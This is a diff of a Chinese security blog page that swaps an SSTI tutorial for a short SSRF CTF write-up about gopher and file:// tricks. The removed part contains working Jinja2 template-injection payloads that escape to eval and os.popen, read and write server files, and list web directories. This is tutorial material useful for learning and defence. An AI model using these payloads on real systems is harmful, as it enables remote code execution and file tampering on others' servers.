@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SSTI, Hbluewhite的Blog">
+    <meta name="keywords" content="SSRF题解（2）, Hbluewhite的Blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SSTI | Hbluewhite的Blog</title>
+    <title>SSRF题解（2） | Hbluewhite的Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -356,12 +356,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SSTI</h1>
+                    <h1 class="description center-align post-title">SSRF题解（2）</h1>
                 </div>
             </div>
         </div>
@@ -477,8 +477,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Web-bug/">
-                                <span class="chip bg-color">Web bug</span>
+                            <a href="/tags/SSRF/">
+                                <span class="chip bg-color">SSRF</span>
                             </a>
                         
                     </div>
@@ -493,7 +493,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-09-08
+                    2021-09-11
                 </div>
                 
 
@@ -514,51 +514,31 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h2 id="什么是SSTI"><a href="#什么是SSTI" class="headerlink" title="什么是SSTI"></a>什么是SSTI</h2><p>SSTI就是服务端模板注入（Server-Side Template Injection）,也给出了一个注入的概念。</p>
-<p>常见的注入有：SQL 注入，XSS 注入，XPATH 注入，XML 注入，代码注入，命令注入等等。sql注入已经出世很多年了，对于sql注入的概念和原理很多人应该是相当清楚了，SSTI也是注入类的漏洞，其成因其实是可以类比于sql注入的。</p>
-<p>sql注入是从用户获得一个输入，然后又后端脚本语言进行数据库查询，所以可以利用输入来拼接我们想要的sql语句，当然现在的sql注入防范做得已经很好了，然而随之而来的是更多的漏洞。</p>
-<p><strong>SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako tornado django，php的smarty twig，java的jade velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。</strong></p>
-<p>现在网上提起的比较多的是Python的网站。</p>
-<h2 id="什么是模板引擎？"><a href="#什么是模板引擎？" class="headerlink" title="什么是模板引擎？"></a>什么是模板引擎？</h2><pre><code> 模板引擎（这里特质用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的。它可以特定生产格式的文档，用于网站的模板引擎就会生成一个标准的Html文档。
-</code></pre>
-<p>​    也就是说，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后就生成模板+用户数据前端的html页面，然后反馈给浏览器，呈现在用户面前。</p>
-<p><strong>模板引擎可以使用沙箱机制来进行漏洞防范，我们可以用沙箱逃逸技术来进行绕过。</strong></p>
-<p>PS. php(或者其他脚本语言)代码通过访问模板引擎，模板引擎通过正则匹配产生一个新的缓存的html页面，从而实现php与html代码的分离。</p>
-<h2 id="为什么要模板引擎"><a href="#为什么要模板引擎" class="headerlink" title="为什么要模板引擎"></a>为什么要模板引擎</h2><p>​    如果在一个页面中php代码与html代码混合在一起，在很多时候都会造成不便，用模板引擎可以让php代码和html代码进行分离。</p>
-<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$output = $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;])); </span><br><span class="line">echo $output;</span><br></pre></td></tr></table></figure>
-
-<p>这是一个比较鸡蛋的例子，对于现在的SSTI在后端处理的时候也会有许多的过滤。</p>
-<p>总之，SSTI就是这个道理，就像sql注入中你用id=-1’ union select database()可以拿到数据库一样，当然在漏洞利用上还是有很多的技巧，也会有绕过的技巧的。</p>
-<h3 id="Flask（JinJa2）服务端模板注入漏洞复现"><a href="#Flask（JinJa2）服务端模板注入漏洞复现" class="headerlink" title="Flask（JinJa2）服务端模板注入漏洞复现"></a>Flask（JinJa2）服务端模板注入漏洞复现</h3><p>ctf中比较常见的还是python站的SSTI，下面的是一道ssti漏洞的题目，展示一下流程。</p>
+                <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><h3 id="考点：gopher协议的使用"><a href="#考点：gopher协议的使用" class="headerlink" title="考点：gopher协议的使用"></a>考点：gopher协议的使用</h3><p>进入题目以后，我们看到的是一个空白页，可输入url栏，然后我们</p>
+<p>根据提示使用file://协议查看index.php,和flag.php。</p>
+<p><img src="/2021/09/11/SSRF%E9%A2%98%E8%A7%A3%EF%BC%882%EF%BC%89/1.png"></p>
+<p><img src="/2021/09/11/SSRF%E9%A2%98%E8%A7%A3%EF%BC%882%EF%BC%89/2.png"></p>
+<p>然后我们发现给出了一个值key并且得到了两个源代码，我们发现在</p>
+<p>index.php中有curl函数，我们可以使用curl函数进行访问。然后我们通过gopher协议</p>
+<p>下面说一下gopher协议的写法</p>
 <ol>
-<li>注入检测</li>
+<li><p>首先我们先要先方式，然后写上传文件，然后HTTP版本</p>
+</li>
+<li><p>在描写完这些过后我们再进行其他内容需要上传的比如key</p>
+</li>
+<li><p>然后我们需要进行urlencoded我们第一次编码需要将所有的%A换成%0D%0A然后再进行两次编码，最后上传就行。</p>
+</li>
 </ol>
-<p>访问<a target="_blank" rel="noopener" href="http://192.168.1.10:8000/">http://192.168.1.10:8000/</a></p>
-<p>传参？name=56</p>
-<p>我们可以得到</p>
-<p><img src="https://img-blog.csdnimg.cn/20190719150209205.png" alt="在这里插入图片描述"></p>
-<p>说明存在SSTI漏洞</p>
-<ol start="2">
-<li>漏洞利用</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">&#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">&#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">&#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">&#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="关于SSTI的python类的知识"><a href="#关于SSTI的python类的知识" class="headerlink" title="关于SSTI的python类的知识"></a>关于SSTI的python类的知识</h2><p>面向对象语言的方法来自于类，对于python，有很多好用的函数库，我们经常会再写Python中用到import来引入许多的类和方法，python的str（字符串）、dict（字典）、tuple（元组）、list（列表）这些在Python类结构的基类都是object，而object拥有众多的子类。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__</span><br><span class="line">&lt;type &#x27;str&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line">&lt;type &#x27;tuple&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line">&lt;type &#x27;list&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__</span><br><span class="line">&lt;type &#x27;dict&#x27;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>_ class _:来查看变量所属的类，根据前面的变量形势可以得到齐属于的类</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__</span><br><span class="line">(&lt;type &#x27;object&#x27;&gt;,)</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__</span><br><span class="line">(&lt;type &#x27;basestring&#x27;&gt;,)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__bases__</span><br><span class="line">(&lt;type &#x27;object&#x27;&gt;,)</span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__.__bases__</span><br><span class="line">(&lt;type &#x27;object&#x27;&gt;,)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [].__class__.__bases__[0]</span><br><span class="line">&lt;type &#x27;object&#x27;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>__bases__：用来查看类的基类，也可是使用数组索引来查看特定位置的值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__bases__[0].__subclasses__()</span><br><span class="line">[&lt;type &#x27;type&#x27;&gt;, &lt;type &#x27;weakref&#x27;&gt;, &lt;type &#x27;weakcallableproxy&#x27;&gt;, &lt;type &#x27;weakproxy&#x27;&gt;, &lt;type &#x27;int&#x27;&gt;, &lt;type &#x27;basestring&#x27;&gt;, &lt;type &#x27;bytearray&#x27;&gt;, &lt;type &#x27;list&#x27;&gt;, &lt;type &#x27;NoneType&#x27;&gt;, &lt;type &#x27;NotImplementedType&#x27;&gt;, &lt;type &#x27;traceback&#x27;&gt;, &lt;type &#x27;super&#x27;&gt;, &lt;type &#x27;xrange&#x27;&gt;, &lt;type &#x27;dict&#x27;&gt;, &lt;type &#x27;set&#x27;&gt;, &lt;type &#x27;slice&#x27;&gt;, &lt;type &#x27;staticmethod&#x27;&gt;, &lt;type &#x27;complex&#x27;&gt;, &lt;type &#x27;float&#x27;&gt;, &lt;type &#x27;buffer&#x27;&gt;, &lt;type &#x27;long&#x27;&gt;, &lt;type &#x27;frozenset&#x27;&gt;, &lt;type &#x27;property&#x27;&gt;, &lt;type &#x27;memoryview&#x27;&gt;, &lt;type &#x27;tuple&#x27;&gt;, &lt;type &#x27;enumerate&#x27;&gt;, &lt;type &#x27;reversed&#x27;&gt;, &lt;type &#x27;code&#x27;&gt;, &lt;type &#x27;frame&#x27;&gt;, &lt;type &#x27;builtin_function_or_method&#x27;&gt;, &lt;type &#x27;instancemethod&#x27;&gt;, &lt;type &#x27;function&#x27;&gt;, &lt;type &#x27;classobj&#x27;&gt;, &lt;type &#x27;dictproxy&#x27;&gt;, &lt;type &#x27;generator&#x27;&gt;, &lt;type &#x27;getset_descriptor&#x27;&gt;, &lt;type &#x27;wrapper_descriptor&#x27;&gt;, &lt;type &#x27;instance&#x27;&gt;, &lt;type &#x27;ellipsis&#x27;&gt;, &lt;type &#x27;member_descriptor&#x27;&gt;, &lt;type &#x27;file&#x27;&gt;, &lt;type &#x27;PyCapsule&#x27;&gt;, &lt;type &#x27;cell&#x27;&gt;, &lt;type &#x27;callable-iterator&#x27;&gt;, &lt;type &#x27;iterator&#x27;&gt;, &lt;type &#x27;sys.long_info&#x27;&gt;, &lt;type &#x27;sys.float_info&#x27;&gt;, &lt;type &#x27;EncodingMap&#x27;&gt;, &lt;type &#x27;fieldnameiterator&#x27;&gt;, &lt;type &#x27;formatteriterator&#x27;&gt;, &lt;type &#x27;sys.version_info&#x27;&gt;, &lt;type &#x27;sys.flags&#x27;&gt;, &lt;type &#x27;sys.getwindowsversion&#x27;&gt;, &lt;type &#x27;exceptions.BaseException&#x27;&gt;, &lt;type &#x27;module&#x27;&gt;, &lt;type &#x27;imp.NullImporter&#x27;&gt;, &lt;type &#x27;zipimport.zipimporter&#x27;&gt;, &lt;type &#x27;nt.stat_result&#x27;&gt;, &lt;type &#x27;nt.statvfs_result&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &lt;class &#x27;_abcoll.Hashable&#x27;&gt;, &lt;type &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_abcoll.Iterable&#x27;&gt;, &lt;class &#x27;_abcoll.Sized&#x27;&gt;, &lt;class &#x27;_abcoll.Container&#x27;&gt;, &lt;class &#x27;_abcoll.Callable&#x27;&gt;, &lt;type &#x27;dict_keys&#x27;&gt;, &lt;type &#x27;dict_items&#x27;&gt;, &lt;type &#x27;dict_values&#x27;&gt;, &lt;class &#x27;site._Printer&#x27;&gt;, &lt;class &#x27;site._Helper&#x27;&gt;, &lt;type &#x27;_sre.SRE_Pattern&#x27;&gt;, &lt;type &#x27;_sre.SRE_Match&#x27;&gt;, &lt;type &#x27;_sre.SRE_Scanner&#x27;&gt;, &lt;class &#x27;site.Quitter&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;type &#x27;operator.itemgetter&#x27;&gt;, &lt;type &#x27;operator.attrgetter&#x27;&gt;, &lt;type &#x27;operator.methodcaller&#x27;&gt;, &lt;type &#x27;functools.partial&#x27;&gt;, &lt;type &#x27;MultibyteCodec&#x27;&gt;, &lt;type &#x27;MultibyteIncrementalEncoder&#x27;&gt;, &lt;type &#x27;MultibyteIncrementalDecoder&#x27;&gt;, &lt;type &#x27;MultibyteStreamReader&#x27;&gt;, &lt;type &#x27;MultibyteStreamWriter&#x27;&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>subclasses</strong>()：查看当前类的子类。</p>
-<p>获取基类还能用还有__mro__，比如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__</span><br><span class="line">(&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__mro__</span><br><span class="line">(&lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__.__mro__</span><br><span class="line">(&lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line">&gt;&gt;&gt; ().__class__.__mro__</span><br><span class="line">(&lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; ().__class__.__mro__[1]            //使用索引就能获取基类了</span><br><span class="line">&lt;class &#x27;object&#x27;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这样我们在进行SSTI注入的时候就可以通过这种方式使用很多的类和方法，通过子类再去获取子类的子类。</p>
-<h2 id="一些常用的方法"><a href="#一些常用的方法" class="headerlink" title="一些常用的方法"></a>一些常用的方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//获取基本类</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">object</span><br><span class="line"></span><br><span class="line">//读文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](r&#x27;C:\1.php&#x27;).read()</span><br><span class="line">object.__subclasses__()[40](r&#x27;C:\1.php&#x27;).read()</span><br><span class="line"></span><br><span class="line">//写文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;).write(&#x27;123&#x27;)</span><br><span class="line">object.__subclasses__()[40](&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;).write(&#x27;123&#x27;)</span><br><span class="line"></span><br><span class="line">//执行任意命令</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27; )</span><br><span class="line">object.__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27; )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
+<p>我们得到的是这样的</p>
+<p><img src="/2021/09/11/SSRF%E9%A2%98%E8%A7%A3%EF%BC%882%EF%BC%89/3.png"></p>
+<p>然后就可以得到flag</p>
+<p><strong>题后反思</strong>：主要就是gopher协议的使用</p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="考点：gopher协议的构建"><a href="#考点：gopher协议的构建" class="headerlink" title="考点：gopher协议的构建"></a>考点：gopher协议的构建</h3><p>进入题目之后，我们先根据提示访问flag.php，然后我们就可以看到一个文件上传的端口但是缺少了submit，需要我们自己编写然后，我们根据提示上传flag.php文件</p>
+<p><img src="/2021/09/11/SSRF%E9%A2%98%E8%A7%A3%EF%BC%882%EF%BC%89/4.png"></p>
+<p>然后我们自己添加之后我们上传一个不为空白的文件</p>
+<p><img src="/2021/09/11/SSRF%E9%A2%98%E8%A7%A3%EF%BC%882%EF%BC%89/5.png"></p>
+<p>然后我们使用bp抓包按照POST方式进行gopher协议的搭建最后就可以上传了，就可以得到flag了。</p>
+<p><strong>题后反思</strong>：上传文件我们一般可以通过gopher协议进行如果不行可以考虑tf协议。</p>
 
                 
             </div>
@@ -585,7 +565,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/09/08/SSTI/">http://example.com/2021/09/08/SSTI/</a>
+                    <a href="http://example.com/2021/09/11/SSRF%E9%A2%98%E8%A7%A3%EF%BC%882%EF%BC%89/">http://example.com/2021/09/11/SSRF%E9%A2%98%E8%A7%A3%EF%BC%882%EF%BC%89/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -623,8 +603,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Web-bug/">
-                                    <span class="chip bg-color">Web bug</span>
+                                <a href="/tags/SSRF/">
+                                    <span class="chip bg-color">SSRF</span>
                                 </a>
                             
                         </div>
@@ -1062,9 +1042,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/09/11/SSRF%E9%A2%98%E8%A7%A3%EF%BC%882%EF%BC%89/">
                     <div class="card-image">
@@ -1082,9 +1063,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-09-11
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-11
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1093,6 +1074,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1111,13 +1093,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/08/27/curl/">
+                <a href="/2021/09/08/SSTI/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.png" class="responsive-img" alt="curl">
+                        <img src="/medias/featureimages/0.png" class="responsive-img" alt="SSTI">
                         
-                        <span class="card-title">curl</span>
+                        <span class="card-title">SSTI</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1128,7 +1110,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-27
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-08
                             </span>
                         <span class="publish-author">
                             
@@ -1141,8 +1123,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">
-                        <span class="chip bg-color">常用命令</span>
+                    <a href="/tags/Web-bug/">
+                        <span class="chip bg-color">Web bug</span>
                     </a>
                     
                 </div>
